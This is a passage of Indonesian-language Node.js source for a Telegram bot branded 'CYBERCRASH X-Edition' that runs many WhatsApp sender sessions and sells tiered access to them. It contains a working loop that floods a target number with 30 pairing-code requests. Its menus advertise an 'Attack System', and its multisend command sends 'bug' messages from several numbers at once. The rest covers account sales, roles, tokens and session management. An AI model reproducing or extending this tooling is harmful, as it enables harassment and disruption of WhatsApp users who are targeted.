    }, 60000); // 1 Menit

    // [FITUR 3] REFRESH SENDER (Setiap 10 Menit / 600000ms)
    setInterval(() => {
        console.log(chalk.magenta(`[Auto-Refresh] Membersihkan sesi hantu...`));
        
        if (!fs.existsSync(file_session)) return;
        let activeNumbers = JSON.parse(fs.readFileSync(file_session));
        let hasChanges = false;

        // Filter nomor yang benar-benar tidak ada di memory sessions atau error parah
        const validNumbers = activeNumbers.filter(number => {
            const socket = sessions.get(number);
            
            const isDead = !socket; 
            
            if (isDead) {
                console.log(chalk.red(`[Auto-Refresh] Menghapus sender ${number} dari database karena tidak aktif.`));
                hasChanges = true;
                // Bersihkan folder sesi juga biar bersih
                try {
                    const dir = sessionPath(number);
                    if(fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
                } catch(e) {}
                return false; // Hapus dari list
            }
            return true; // Keep
        });

        if (hasChanges) {
            fs.writeFileSync(file_session, JSON.stringify(validNumbers, null, 2));
            sendTelegramAlert(`♻️ <b>REFRESH SENDER</b>\nSesi yang tidak aktif telah dibersihkan dari database.`);
        } else {
            console.log(chalk.magenta(`[Auto-Refresh] Semua sesi valid.`));
        }

    }, 600000); // 10 Menit
};


const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  const total = 30; // jumlah pengiriman
  const delayMs = 2000; // jeda 2 detik

  try {
    await ctx.reply(
      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
      { parse_mode: "HTML" }
    );

    // pastikan koneksi WA aktif
    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");

    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "TOXICXXI");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.sendMessage(
          chatId,
          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (err) {
        await ctx.telegram.sendMessage(
          chatId,
          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
          { parse_mode: "HTML" }
        );
      }

      await new Promise(r => setTimeout(r, delayMs));
    }

    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });

  } catch (error) {
    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
  }
};


function getRuntime(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

// --- HELPER FUNCTION: DELETE & SEND (Supaya rapi) ---
// Fungsi ini tugasnya menghapus pesan lama dulu, baru kirim pesan baru
const deleteAndReply = async (ctx, text, keyboard) => {
    try {
        // Hapus pesan lama (pesan yang ada tombolnya)
        await ctx.deleteMessage().catch(() => {}); 
    } catch (e) {
        // Abaikan jika gagal hapus (misal pesan sudah terhapus duluan)
    }
    // Kirim pesan baru
    await ctx.reply(text, { parse_mode: 'HTML', ...keyboard });
};

// --- 1. MAIN MENU (POLL STYLE) ---
const sendMainMenu = async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

    const textMenu = `
<blockquote>¿CYBER X-Editon | — Keiraaa</blockquote>
<b>CONTROL CENTER V4.5</b>

<blockquote>⌗ User: ${username}</blockquote>
━━━━━━━━━━━━━━━
<b>📋 MAIN NAVIGATION (POLL)</b>
Silakan pilih modul yang ingin diakses:
━━━━━━━━━━━━━━━
`;

    // Tombol dibuat Vertikal (Poll Style)
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('Menu Available (Fitur Dasar)', 'menu_available')],
        [Markup.button.callback('Control Panel', 'control_available')],
        [Markup.button.callback('Account Manager', 'account_manager')],
        [Markup.button.url('Contact Developer', 'https://t.me/Keiraa_md')]
    ]);

    if (ctx.updateType === 'callback_query') {
        await deleteAndReply(ctx, textMenu, keyboard);
    } else {
        await ctx.reply(textMenu, { parse_mode: 'HTML', ...keyboard });
    }
};

// --- 2. COMMAND START ---
bot.command("start", async (ctx) => {
    let loadingMsg = await ctx.reply("<b>↻ System Booting... [ 20% ]</b>", { parse_mode: 'HTML' });

    const steps = [
        "<b>↻ Loading Modules... [ 50% ]</b>",
        "<b>↻ Checking Database... [ 80% ]</b>",
        "<b>↻ Access Granted! [ 100% ]</b>"
    ];

    for (const step of steps) {
        await new Promise(r => setTimeout(r, 800));
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, step, { parse_mode: 'HTML' });
        } catch (e) {}
    }

    await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
    await sendMainMenu(ctx);
});

// --- 3. MENU AVAILABLE (Pairing & List) ---
bot.action('menu_available', async (ctx) => {
    const textAvailable = `
<blockquote>📂 <b>MENU AVAILABLE</b></blockquote>
Gunakan perintah berikut untuk manajemen koneksi:

<b>📡 Connections:</b>
/Pairing - <i>Sambungkan Sender Baru</i>
/SenderActived - <i>Lihat Sender Terhubung</i>
/cekhost - <i>Cek Status Server</i>
/stop - <i>Matikan Bot Sementara</i>
/SenderOnline - <i> Hidupkan Kembali Sender</i>

<b>🛠️ Utilities:</b>
/cekid - <i>Cek ID Telegram</i>
/ping - <i>Cek Kecepatan Respon</i>
`;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🔙 Kembali ke Menu Utama', 'back_home')]
    ]);
    await deleteAndReply(ctx, textAvailable, keyboard);
});

// --- 4. CONTROL PANEL (Role & Multisend) ---
bot.action('control_available', async (ctx) => {
    const textControl = `
<blockquote>🎮 <b>CONTROL PANEL</b></blockquote>
Panel kendali untuk Role dan Serangan:

<b>⚔️ Attack System:</b>
/multisend [jumlah] - <i>Set Multi Sender</i>

<b>👑 Role Management:</b>
/inviteowner | /invitemanager
/invitept | /inviteresseler
/invitevip | /invitestaff

<b>🔎 Check Role:</b>
/cekowner | /cekmanager
/cekpartner | /cekreseller

<b>🛡️ Security:</b>
/blacklist [id] [durasi]
/unblacklist [id]
`;
    const keyboard = Markup.inlineKeyboard([[Markup.button.callback('🔙 Kembali', 'back_home')]]);
    await deleteAndReply(ctx, textControl, keyboard);
});

// --- 5. ACCOUNT MANAGER (Create Account) ---
bot.action('account_manager', async (ctx) => {
    const textAcc = `
<blockquote>🔐 <b>ACCOUNT MANAGER</b></blockquote>
Kelola akun pengguna dashboard:

<b>👤 User Actions:</b>
/CreateAccount - <i>Buat Akun Baru</i>
/DeleteAccount - <i>Hapus Akun</i>
/ListAccount - <i>Lihat Semua Akun</i>
/resetpassword - <i>Reset Password User</i>
/addexpired - <i>Tambah Durasi User</i>
`;
    const keyboard = Markup.inlineKeyboard([[Markup.button.callback('🔙 Kembali', 'back_home')]]);
    await deleteAndReply(ctx, textAcc, keyboard);
});

bot.action('back_home', async (ctx) => { await sendMainMenu(ctx); });

// ==============================================
// 🔥 LOGIC MULTISEND (SISTEM PENGIRIMAN PARALEL)
// ==============================================

// Global Variable untuk menyimpan setting multisend
let multiSendConfig = {
    count: 1, // Default 1 sender
    isActive: false
};

bot.command('multisend', async (ctx) => {
    const args = ctx.message.text.split(' ');
    
    // Validasi Input
    if (args.length < 2) {
        return ctx.reply(`
<b>⚠️ Format Salah!</b>
Gunakan: <code>/multisend [jumlah]</code>

Contoh:
<code>/multisend 2</code> (Pakai 2 nomor sekaligus)
<code>/multisend all</code> (Pakai SEMUA nomor yg ada)
        `, { parse_mode: 'HTML' });
    }

    // Ambil Total Sender Aktif dari Map Sessions
    // (Asumsi variable 'sessions' ada di index.js/global)
    const totalActive = sessions.size; 
    
    if (totalActive === 0) {
        return ctx.reply("❌ Tidak ada sender yang terhubung! Silakan /pairing dulu.");
    }

    let requestCount = args[1];
    let finalCount = 1;

    if (requestCount.toLowerCase() === 'all') {
        finalCount = totalActive;
    } else {
        finalCount = parseInt(requestCount);
        if (isNaN(finalCount) || finalCount < 1) return ctx.reply("❌ Jumlah harus angka valid.");
        if (finalCount > totalActive) {
            return ctx.reply(`❌ Kamu cuma punya ${totalActive} sender aktif. Tidak bisa pakai ${finalCount}.`);
        }
    }

    // Simpan Konfigurasi
    multiSendConfig.count = finalCount;
    multiSendConfig.isActive = (finalCount > 1);

    return ctx.reply(`
<blockquote>✅ <b>MULTISEND ACTIVATED</b></blockquote>
━━━━━━━━━━━━━━━
⚙️ <b>Status:</b> Active
🔢 <b>Jumlah Sender:</b> ${finalCount} / ${totalActive}
🚀 <b>Mode:</b> Parallel Execution

<i>Sekarang saat kamu mengirim bug/pesan, sistem akan menggunakan ${finalCount} nomor sekaligus.</i>
    `, { parse_mode: 'HTML' });
});

bot.command('addexp', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply("⚠️ Format: <code>/addexp [username] [jumlah_hari]</code>", { parse_mode: 'HTML' });

    const targetUser = args[1];
    const days = parseInt(args[2]);

    if (isNaN(days)) return ctx.reply("❌ Jumlah hari harus angka.");

    // --- PENGGUNAAN FUNGSI MILIKMU ---
    let db = getUsers(); // Ambil data pakai fungsi yang sudah ada
    const index = db.findIndex(u => u.username === targetUser);

    if (index === -1) return ctx.reply("❌ User tidak ditemukan di database.");

    // Hitung Expired Baru (Dari sekarang + X hari)
    const newExpired = Date.now() + (days * 24 * 60 * 60 * 1000);
    db[index].expired = newExpired;
    
    // Simpan perubahan pakai fungsi yang sudah ada
    saveUsers(db); 

    const dateStr = new Date(newExpired).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    ctx.reply(`✅ <b>Berhasil!</b>\nUser: <code>${targetUser}</code>\nExpired Baru: ${dateStr}`, { parse_mode: 'HTML' });
});

bot.command('resetpassword', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 3) return ctx.reply("⚠️ Format: <code>/resetpassword [username] [password_baru]</code>", { parse_mode: 'HTML' });

    const targetUser = args[1];
    const newPass = args[2];

    // --- PENGGUNAAN FUNGSI MILIKMU ---
    let db = getUsers(); // Ambil data
    const index = db.findIndex(u => u.username === targetUser);

    if (index === -1) return ctx.reply("❌ User tidak ditemukan di database.");

    db[index].key = newPass; 
    
    saveUsers(db);

    ctx.reply(`✅ <b>Password Reset!</b>\nUser: <code>${targetUser}</code>\nPassword Baru: <code>${newPass}</code>`, { parse_mode: 'HTML' });
});

// 7. COMMAND: /SenderOnline (Hidupkan Ulang Sender)
// Format: /SenderOnline [nomor_wa]
bot.command('SenderOnline', async (ctx) => {
    // 1. Ambil Argumen Nomor
    const args = ctx.message.text.split(' ');
    
    // Validasi Input
    if (args.length < 2) {
        return ctx.reply(
            "⚠️ <b>Format Salah!</b>\nGunakan: <code>/SenderOnline [nomor_wa]</code>\nContoh: <code>/SenderOnline 6281234567890</code>", 
            { parse_mode: 'HTML' }
        );
    }

    const targetNumber = args[1];

    if (fs.existsSync(file_session)) {
        const dbData = JSON.parse(fs.readFileSync(file_session));
        if (!dbData.includes(targetNumber)) {
            return ctx.reply(`❌ <b>Gagal!</b>\nNomor <code>${targetNumber}</code> tidak terdaftar di database sender.`, { parse_mode: 'HTML' });
        }
    }

    // 3. Kirim Pesan Loading
    const loadingMsg = await ctx.reply(`🔄 <b>Processing...</b>\nMencoba menghubungkan ulang sender <code>${targetNumber}</code>...`, { parse_mode: 'HTML' });

    try {
        const result = await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);

        let finalText = "";

        if (result.status) {

            if (result.message && result.message.includes("Already")) {
                finalText = `✅ <b>Sender Sudah Online!</b>\nNomor: <code>${targetNumber}</code>\nStatus: 🟢 Active & Ready\n\n<i>Sender sudah berjalan normal, tidak perlu reconnect.</i>`;
            } 
            // Skenario 2: Berhasil Reconnect (Socket Baru dibuat)
            else {
                finalText = `🚀 <b>Berhasil Reconnect!</b>\nNomor: <code>${targetNumber}</code>\nStatus: 🟡 Initializing...\n\n<i>System sedang membangun ulang koneksi WhatsApp. Tunggu beberapa detik hingga status 'Connected' muncul di console.</i>`;
            }
        } else {
            // Skenario 3: Gagal (Error internal addSender)
            finalText = `❌ <b>Gagal Menghubungkan!</b>\nNomor: <code>${targetNumber}</code>\nError: ${result.message}`;
        }

        // 5. Update Pesan Telegram
        await ctx.telegram.editMessageText(
            ctx.chat.id, 
            loadingMsg.message_id, 
            null, 
            finalText, 
            { parse_mode: 'HTML' }
        );

    } catch (error) {
        console.error("SenderOnline Error:", error);
        await ctx.telegram.editMessageText(
            ctx.chat.id, 
            loadingMsg.message_id, 
            null, 
            `❌ <b>System Error</b>\nTerjadi kesalahan pada server saat mencoba reconnect.\nLogs: ${error.message}`, 
            { parse_mode: 'HTML' }
        );
    }
});

bot.command('ping', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    const start = Date.now();
    const msg = await ctx.reply(`🏓 <b>Pong!</b>\nChecking connection...`, { parse_mode: 'HTML' });
    const end = Date.now();
    const latency = end - start;

    await ctx.telegram.editMessageText(
        ctx.chat.id, 
        msg.message_id, 
        null, 
        `🏓 <b>Pong!</b>\n👤 User: ${username}\n🚀 Latency: <b>${latency}ms</b>\n⚡ Server: <b>Fast & Stable</b>`, 
        { parse_mode: 'HTML' }
    );
});

// 2. COMMAND: /cekid (Cek ID Telegram)
bot.command('cekid', (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    
    const text = `
<blockquote>🆔 <b>USER INFORMATION</b></blockquote>
━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
🔢 <b>User ID:</b> <code>${ctx.from.id}</code>
💬 <b>Chat ID:</b> <code>${ctx.chat.id}</code>
Testing: <b>Verified User</b>
━━━━━━━━━━━━━━━
`;
    ctx.reply(text, { parse_mode: 'HTML' });
});

// 3. COMMAND: /cekhost (Cek Status Server)
bot.command('cekhost', (ctx) => {
    const os = require('os');
    const uptime = process.uptime();
    
    // Format Uptime (Jam Menit Detik)
    const h = Math.floor(uptime / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    const s = Math.floor(uptime % 60);
    
    const ramTotal = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const ramFree = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);

    const text = `
<blockquote>🖥️ <b>SERVER STATUS</b></blockquote>
━━━━━━━━━━━━━━━
⚙️ <b>OS:</b> ${os.type()} ${os.release()}
⏳ <b>Uptime:</b> ${h}h ${m}m ${s}s
💾 <b>RAM:</b> ${ramFree}GB / ${ramTotal}GB
🔌 <b>NodeJS:</b> ${process.version}
🟢 <b>Status:</b> Online & Running
━━━━━━━━━━━━━━━
`;
    ctx.reply(text, { parse_mode: 'HTML' });
});

// 4. COMMAND: /stop (Matikan Bot/Maintenance)
bot.command('stop', async (ctx) => {
    const OWNER_ID = 8312382874; // GANTI DENGAN ID KAMU
    
    if (ctx.from.id !== OWNER_ID) {
        return ctx.reply("❌ <b>Akses Ditolak!</b> Hanya Owner yang bisa mematikan server.", { parse_mode: 'HTML' });
    }

    await ctx.reply("⚠️ <b>SYSTEM SHUTDOWN</b>\nBot akan dimatikan dalam 3 detik...", { parse_mode: 'HTML' });
    
    setTimeout(() => {
        console.log("Bot stopped by owner via Telegram.");
        process.exit(0); // Mematikan proses server
    }, 3000);
});

// ==========================================
// COMMAND: PAIRING (Owner & Staff Only)
// ==========================================
bot.command("Pairing", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // 1. Cek Akses (Hanya Owner & Staff Sender)
  if (!isOwner(userId) && !isStaffSender(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner & Staff Sender.", { parse_mode: "HTML" });
  }

  const args = ctx.message.text.split(" ");
  const BotNumber = args[1];

  // 2. Validasi Input
  if (!BotNumber || isNaN(BotNumber)) {
    return ctx.reply("⚠️ <b>Format Salah!</b>\nGunakan: <code>/Pairing 628xxx</code>", { parse_mode: "HTML" });
  }

  // 3. Eksekusi
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});


// ==========================================
// COMMAND: DELBOT / HAPUS SESI (Owner & Staff Only)
// ==========================================
bot.command(["delbot", "delsesi"], async (ctx) => {
  const userId = ctx.from.id.toString();

  // 1. Cek Akses (Hanya Owner & Staff Sender)
  if (!isOwner(userId) && !isStaffSender(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner & Staff Sender.", { parse_mode: "HTML" });
  }

  const args = ctx.message.text.split(" ");
  const BotNumber = args[1];

  // 2. Validasi Input
  if (!BotNumber) {
    return ctx.reply("⚠️ <b>Format Salah!</b>\nGunakan: <code>/delbot 628xxx</code>", { parse_mode: "HTML" });
  }

  // 3. Eksekusi Hapus
  try {
    // Cek apakah nomor ada di list aktif atau folder
    const dir = sessionPath(BotNumber);
    if (!sessions.has(BotNumber) && !fs.existsSync(dir)) {
      return ctx.reply(`⚠️ Sesi <b>${BotNumber}</b> tidak ditemukan.`, { parse_mode: "HTML" });
    }

    // Panggil fungsi global delActive yang sudah dibuat sebelumnya
    delActive(BotNumber);

    await ctx.reply(`✅ <b>Sukses Menghapus Sesi!</b>\nNomor: <code>${BotNumber}</code> berhasil dihapus dari database & folder.`, { parse_mode: "HTML" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menghapus sesi.");
  }
});


// ==========================================
// COMMAND: SENDER ACTIVED (List Online)
// ==========================================
bot.command("SenderActived", (ctx) => {
  // Cek apakah ada sesi yang jalan di memory
  if (sessions.size === 0) {
    return ctx.reply("❌ <b>Tidak ada Sender yang Online.</b>", { parse_mode: "HTML" });
  }

  // Buat list nomor
  const daftarSender = [...sessions.keys()]
    .map((n, index) => `${index + 1}. <code>${n}</code>`)
    .join("\n");

  const total = sessions.size;

  ctx.reply(
    `<blockquote><b>📌 SENDER CONNECTION</b></blockquote>\n` +
    `<b>Status:</b> CYBERCRASH X-Edition\n` +
    `<b>Total Online:</b> ${total}\n\n` +
    `<b>LIST SENDER:</b>\n` +
    `${daftarSender}\n\n` +
    `<blockquote><b>⚠️ PERHATIAN</b>\n` +
    `Sender bisa disconnect sewaktu-waktu. Gunakan <code>/cekstaff</code> untuk melihat siapa penanggung jawab sender.</blockquote>`, 
    { parse_mode: "HTML" }
  );
});


bot.command('OpenAkses', (ctx) => {
    // Sesuai request: Username WAJIB "KeiraaKuu"
    const fixedUser = 'KeiraaKuu'; 
    
    // Generate Token Acak
    const randomStr = Math.random().toString(36).substring(2, 6).toUpperCase();
    const randomNum = Math.floor(1000 + Math.random() * 9000);
    const token = `TKC-${randomStr}-${randomNum}`;

    // Simpan ke Database Server
    // Kunci utamanya adalah 'KeiraaKuu'
    tkcDatabase[fixedUser] = {
        token: token,
        used: false
    };

    const message = `
🔓 *AKSES TKC DIBUKA* 🔓

👤 *Username Wajib:* \`${fixedUser}\`
🔑 *Token Akses:* \`${token}\`

_Data tersimpan di server._
_Silahkan masukkan Username & Token di Website._
    `;

    ctx.replyWithMarkdown(message);
    console.log(`[TKC] Token generated for ${fixedUser}: ${token}`);
});

bot.command('addcoin', (ctx) => {
    // 1. Validasi Owner (Ganti dengan ID Telegram Owner)
    const ownerId = 123456789; 
    if (ctx.from.id !== ownerId) return ctx.reply('❌ Maaf, command ini khusus Owner.');

    const args = ctx.message.text.split(' ');
    // args[0] = /addcoin
    // args[1] = username (target)
    // args[2] = jumlah

    if (args.length < 3) {
        return ctx.reply('⚠️ Format Salah!\nGunakan: /addcoin <username> <jumlah>\nContoh: /addcoin keiraa 10000');
    }

    let targetUsername = args[1];
    const amount = parseInt(args[2]);

    // Hapus karakter '@' jika admin mengetikkannya
    if (targetUsername.startsWith('@')) {
        targetUsername = targetUsername.substring(1);
    }

    if (isNaN(amount)) return ctx.reply('❌ Jumlah coin harus berupa angka!');

    try {
        // Cari user berdasarkan 'name' atau 'username' di database
        // Asumsi DB: global.db.data.users = { '628xxx': { name: 'keiraa', coin: 0 } }
        let userKey = Object.keys(global.db.data.users).find(
            k => global.db.data.users[k].name === targetUsername
        );

        if (!userKey) {
            return ctx.reply(`❌ User dengan username '${targetUsername}' tidak ditemukan di database.`);
        }

        // Tambah Coin
        global.db.data.users[userKey].coin = (global.db.data.users[userKey].coin || 0) + amount;

        ctx.reply(`✅ Berhasil menambahkan ${amount} Coin ke akun '${targetUsername}'.\n💰 Total Coin: ${global.db.data.users[userKey].coin}`);

    } catch (err) {
        console.error(err);
        ctx.reply('❌ Terjadi kesalahan server.');
    }
});
// === Command: /add (Tambah Session WhatsApp dari file reply) ===
bot.command("upsessions", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  // 🔒 Cek hanya owner
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg || !replyMsg.document) {
    return ctx.reply("❌ Balas file session dengan perintah /add");
  }

  const doc = replyMsg.document;
  const name = doc.file_name.toLowerCase();

  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session...");

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "sess-"));

    // Ekstrak file
    if (name.endsWith(".json")) {
      await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fs.promises.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    // 🔍 Cari creds.json
    const findCredsFile = async (dir) => {
      const files = await fs.promises.readdir(dir, { withFileTypes: true });
      for (const file of files) {
        const filePath = path.join(dir, file.name);
        if (file.isDirectory()) {
          const found = await findCredsFile(filePath);
          if (found) return found;
        } else if (file.name === "creds.json") {
          return filePath;
        }
      }
      return null;
    };

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di file session.");
    }

    const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
    const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
    if (!botNumber) return ctx.reply("❌ creds.json tidak valid (me.id tidak ditemukan)");

    // Buat folder tujuan
    const destDir = sessionPath(botNumber);
    await fs.promises.rm(destDir, { recursive: true, force: true });
    await fs.promises.mkdir(destDir, { recursive: true });

    // Copy isi folder temp ke folder sesi
    const copyDir = async (src, dest) => {
      const entries = await fs.promises.readdir(src, { withFileTypes: true });
      for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
          await fs.promises.mkdir(destPath, { recursive: true });
          await copyDir(srcPath, destPath);
        } else {
          await fs.promises.copyFile(srcPath, destPath);
        }
      }
    };
    await copyDir(tmp, destDir);

    // Simpan aktif
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(botNumber)) {
      fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
    }

    // Coba konekkan
    await connectToWhatsApp(botNumber, chatId, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan dan online.`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error /add:", err);
    return ctx.reply(`❌ Gagal memproses session:\n${err.message}`);
  }
});

// --- STATE MANAGEMENT SEMENTARA ---
// Menyimpan data proses pembuatan akun per user
const creationState = {}; 

// --- 1. COMMAND UTAMA: /CreateAccount <Username> ---
bot.command("CreateAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // 1. Hapus pesan user agar rapi
  autoDelete(ctx, ctx.message.message_id, 100);

  // 2. Validasi Akses (Minimal punya akses authorized)
  if (!isAuthorized(userId)) {
    const msg = await ctx.reply("😹—Lu siapa tolol, Buy Account Only @Pahlawanppp");
    return autoDelete(ctx, msg.message_id, 3000);
  }

  // 3. Ambil Username dari Argumen
  const args = ctx.message.text.split(" ");
  const targetUsername = args[1];

  if (!targetUsername) {
    const msg = await ctx.reply(
      "⚠️ <b>Format Salah!</b>\nHanya masukkan username.\nContoh: <code>/CreateAccount Keiraa</code>", 
      { parse_mode: "HTML" }
    );
    return autoDelete(ctx, msg.message_id, 5000);
  }

  // 4. Simpan State Awal
  creationState[userId] = {
    step: 'duration',
    username: targetUsername,
    duration: null,
    role: null,
    key: null
  };

  // 5. Tampilkan Menu Durasi
  await ctx.reply(
    `🛠 <b>Create Account: ${targetUsername}</b>\n\nSilahkan pilih <b>DURASI</b> akun:`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '1 Hari', callback_data: 'set_dur_1d' },
            { text: '3 Hari', callback_data: 'set_dur_3d' },
            { text: '7 Hari', callback_data: 'set_dur_7d' }
          ],
          [
            { text: '30 Hari', callback_data: 'set_dur_30d' },
            { text: '60 Hari', callback_data: 'set_dur_60d' }
          ],
          [{ text: '❌ Cancel', callback_data: 'cancel_creation' }]
        ]
      }
    }
  );
});

// --- 2. ACTION: PILIH DURASI ---
bot.action(/^set_dur_(.+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const durasiStr = ctx.match[1]; // Ambil 1d, 3d, dll

  if (!creationState[userId]) return ctx.deleteMessage().catch(()=>{});

  // Simpan Durasi ke State
  creationState[userId].duration = durasiStr;
  creationState[userId].step = 'role';

  // --- LOGIKA HIERARKI ROLE ---
  // Tentukan tombol role apa saja yang boleh muncul berdasarkan jabatan user
  let allowedRoles = [];

  if (isOwner(userId)) {
    allowedRoles = ['Member', 'Reseller', 'Partner', 'VIP', 'Staff', 'Manager', 'Owner'];
  } else if (isManager(userId)) {
    allowedRoles = ['Member', 'Reseller', 'Partner', 'VIP', 'Staff', 'Manager'];
  } else if (isStaff(userId)) {
    allowedRoles = ['Member', 'Reseller', 'Partner', 'VIP', 'Staff'];
  } else if (isVIP(userId)) {
    allowedRoles = ['Member', 'Reseller', 'Partner', 'VIP'];
  } else if (isPartner(userId)) {
    allowedRoles = ['Member', 'Reseller', 'Partner'];
  } else if (isReseller(userId)) {
    allowedRoles = ['Member', 'Reseller'];
  } else {
    // Default fallback (Member only)
    allowedRoles = ['Member'];
  }

  // Buat Keyboard Role Dinamis (2 tombol per baris)
  const roleButtons = [];
  let tempRow = [];
  
  allowedRoles.forEach((role) => {
    tempRow.push({ text: role, callback_data: `set_role_${role.toLowerCase()}` });
    if (tempRow.length === 2) {
      roleButtons.push(tempRow);
      tempRow = [];
    }
  });
  if (tempRow.length > 0) roleButtons.push(tempRow);
  
  // Tambah tombol cancel
  roleButtons.push([{ text: '❌ Cancel', callback_data: 'cancel_creation' }]);

  // Edit pesan sebelumnya menjadi Menu Role
  await ctx.editMessageText(
    `🛠 <b>Create Account: ${creationState[userId].username}</b>\n` +
    `⏱ Durasi: ${durasiStr}\n\n` +
    `Silahkan pilih <b>ROLE</b> akses:`,
    {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: roleButtons }
    }
  ).catch(() => {});
});

// --- 3. ACTION: PILIH ROLE ---
bot.action(/^set_role_(.+)$/, async (ctx) => {
  const userId = ctx.from.id.toString();
  const selectedRole = ctx.match[1]; // member, reseller, etc

  if (!creationState[userId]) return ctx.deleteMessage().catch(()=>{});

  // Simpan Role ke State
  creationState[userId].role = selectedRole;
  creationState[userId].step = 'password_mode';

  // Tampilkan Pilihan Password
  await ctx.editMessageText(
    `🛠 <b>Create Account: ${creationState[userId].username}</b>\n` +
    `⏱ Durasi: ${creationState[userId].duration}\n` +
    `tags Role: ${selectedRole.toUpperCase()}\n\n` +
    `Silahkan pilih metode <b>PASSWORD</b>:`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🎲 Auto Generate', callback_data: 'pass_auto' },
            { text: '⌨️ Manual Custom', callback_data: 'pass_manual' }
          ],
          [{ text: '❌ Cancel', callback_data: 'cancel_creation' }]
        ]
      }
    }
  ).catch(() => {});
});

// --- 4A. ACTION: PASSWORD AUTO ---
bot.action('pass_auto', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!creationState[userId]) return ctx.deleteMessage().catch(()=>{});

  // Generate Random Key
  const randomKey = generateKey(5); // Pastikan fungsi generateKey ada
  finalizeCreation(ctx, userId, randomKey);
});

// --- 4B. ACTION: PASSWORD MANUAL ---
bot.action('pass_manual', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!creationState[userId]) return ctx.deleteMessage().catch(()=>{});

  // Update State Menunggu Input
  creationState[userId].step = 'waiting_password_input';

  // Minta User Ketik
  await ctx.editMessageText(
    `✍️ <b>Silahkan Ketik Password Custom Anda:</b>\n\n` +
    `<i>Balas pesan ini dengan password yang diinginkan.</i>`,
    { parse_mode: 'HTML' }
  ).catch(() => {});
});

// --- 4C. LISTENER INPUT TEXT (UNTUK MANUAL PASSWORD) ---
bot.on('text', async (ctx, next) => {
  const userId = ctx.from.id.toString();

  // Cek apakah user sedang dalam proses bikin akun & nunggu password
  if (creationState[userId] && creationState[userId].step === 'waiting_password_input') {
    const customKey = ctx.message.text.trim();
    
    // Hapus pesan password user (biar aman/rapi)
    autoDelete(ctx, ctx.message.message_id, 100);

    // Finalisasi
    await finalizeCreation(ctx, userId, customKey);
